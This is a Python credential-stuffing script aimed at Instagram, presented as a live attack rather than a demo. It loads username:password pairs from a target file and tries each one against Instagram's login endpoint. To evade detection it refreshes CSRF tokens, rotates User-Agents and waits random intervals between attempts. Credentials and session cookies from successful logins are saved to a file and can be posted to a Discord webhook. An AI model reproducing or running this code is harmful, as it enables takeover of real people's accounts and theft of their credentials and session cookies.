#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
💀 REAL INSTAGRAM ATTACK - NO DEMO, REAL PENETRATION 💀
Dream's Ultimate Hacker - LIVE ATTACK
"""

import requests
import time
import random
import json
from datetime import datetime
import os
import re

class RealInstagramAttack:
    def __init__(self):
        self.session = requests.Session()
        self.success_count = 0
        self.fail_count = 0
        self.results = []
        
        # Real Instagram headers
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRFToken': '',
            'X-Instagram-AJAX': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/login/'
        }
        
    def extract_csrf_token(self):
        """Get real CSRF token from Instagram"""
        try:
            print("🔑 Extracting CSRF token...")
            response = self.session.get('https://www.instagram.com/accounts/login/', headers=self.headers)
            
            # Extract csrf token
            csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
            if csrf_match:
                self.csrf_token = csrf_match.group(1)
                self.headers['X-CSRFToken'] = self.csrf_token
                print(f"✅ CSRF Token: {self.csrf_token[:20]}...")
                return True
            else:
                print("❌ Failed to extract CSRF token")
                return False
                
        except Exception as e:
            print(f"❌ CSRF extraction error: {e}")
            return False
    
    def attempt_login(self, username, password):
        """Real Instagram login attempt"""
        try:
            print(f"\n🎯 ATTACKING: {username} : {password}")
            
            # Generate encrypted password like real browser
            timestamp = int(time.time())
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"
            
            # Complete login data like real browser
            login_data = {
                'username': username,
                'enc_password': enc_password,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': '{}',
                'source': 'auth_switcher_account'
            }
            
            # Real login attempt
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=self.headers,
                allow_redirects=False
            )
            
            print(f"📡 Status: {response.status_code}")
            
            # Check response
            if response.status_code == 200:
                try:
                    result = response.json()
                    
                    if result.get('authenticated') == True:
                        print(f"🔥🔥🔥 SUCCESS! LOGIN FOUND! 🔥🔥🔥")
                        print(f"✅ Username: {username}")
                        print(f"✅ Password: {password}")
                        
                        # Extract session data
                        cookies = self.session.cookies.get_dict()
                        session_data = {
                            'username': username,
                            'password': password,
                            'timestamp': datetime.now().isoformat(),
                            'cookies': cookies,
                            'status': 'SUCCESS'
                        }
                        
                        self.results.append(session_data)
                        self.success_count += 1
                        
                        # Save immediately
                        self.save_results()
                        
                        # Send Discord alert
                        self.send_discord_alert(username, password, cookies)
                        
                        return True
                        
                    elif 'checkpoint_required' in result:
                        print(f"🔐 Checkpoint required (2FA/Phone) - Account exists!")
                        session_data = {
                            'username': username,
                            'password': password,
                            'timestamp': datetime.now().isoformat(),
                            'status': 'CHECKPOINT_REQUIRED',
                            'note': 'Valid credentials but requires verification'
                        }
                        self.results.append(session_data)
                        self.save_results()
                        return True
                        
                    else:
                        print(f"❌ Failed: {result.get('message', 'Unknown error')}")
                        
                except json.JSONDecodeError:
                    print(f"❌ Invalid JSON response")
                    
            elif response.status_code == 429:
                print(f"⚠️  Rate limited - waiting 30 seconds...")
                time.sleep(30)
                return False
                
            self.fail_count += 1
            return False
            
        except Exception as e:
            print(f"❌ Login error: {e}")
            self.fail_count += 1
            return False
    
    def send_discord_alert(self, username, password, cookies):
        """Send success alert to Discord"""
        try:
            webhook_url = "YOUR_DISCORD_WEBHOOK_URL"  # Add your webhook if you have one
            if not webhook_url or "YOUR_DISCORD" in webhook_url:
                return
                
            message = {
                "content": f"🔥 **INSTAGRAM BREACH SUCCESS** 🔥\n"
                          f"**Username:** {username}\n"
                          f"**Password:** {password}\n"
                          f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                          f"**Cookies:** {len(cookies)} cookies extracted"
            }
            
            requests.post(webhook_url, json=message)
            
        except Exception as e:
            print(f"Discord alert failed: {e}")
    
    def save_results(self):
        """Save attack results"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"REAL_ATTACK_RESULTS_{timestamp}.json"
            
            with open(filename, 'w') as f:
                json.dump(self.results, f, indent=2)
                
            print(f"💾 Results saved: {filename}")
            
        except Exception as e:
            print(f"Save error: {e}")
    
    def run_real_attack(self, target_file="/workspaces/sugarglitch-realops/extracted_project/Python/high_probability_targets.txt"):
        """Execute real penetration attack"""
        print("💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀")
        print("💀 REAL INSTAGRAM PENETRATION ATTACK 💀")
        print("💀 NO DEMO - LIVE ATTACK STARTING NOW 💀")
        print("💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀")
        
        if not os.path.exists(target_file):
            print(f"❌ Target file not found: {target_file}")
            return
        
        # Get CSRF token first
        if not self.extract_csrf_token():
            print("❌ Cannot proceed without CSRF token")
            return
        
        # Load targets
        with open(target_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        print(f"🎯 Loaded {len(targets)} high-probability targets")
        print(f"🚀 Starting REAL attack in 3 seconds...")
        time.sleep(3)
        
        for i, target in enumerate(targets, 1):
            if ':' not in target:
                continue
                
            username, password = target.split(':', 1)
            
            print(f"\n🔥 Attack {i}/{len(targets)}")
            print(f"📊 Success: {self.success_count} | Failed: {self.fail_count}")
            
            # Real attack attempt
            if self.attempt_login(username, password):
                print(f"🎉 BREAKTHROUGH ACHIEVED!")
                # Continue attacking even after success
            
            # Anti-detection delay
            delay = random.randint(8, 20)
            print(f"⏳ Waiting {delay}s to avoid detection...")
            time.sleep(delay)
            
            # Refresh CSRF token every 10 attempts
            if i % 5 == 0:
                print("🔄 Refreshing CSRF token...")
                if not self.extract_csrf_token():
                    print("❌ Failed to refresh CSRF - continuing...")
                    
            # Switch User-Agent every few attempts
            if i % 3 == 0:
                agents = [
                    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                ]
                self.headers['User-Agent'] = random.choice(agents)
        
        print(f"\n💀 ATTACK COMPLETE 💀")
        print(f"✅ Successful breaches: {self.success_count}")
        print(f"❌ Failed attempts: {self.fail_count}")
        
        if self.success_count > 0:
            print(f"🔥🔥🔥 MISSION ACCOMPLISHED! 🔥🔥🔥")
            self.save_results()

if __name__ == "__main__":
    attacker = RealInstagramAttack()
    attacker.run_real_attack()
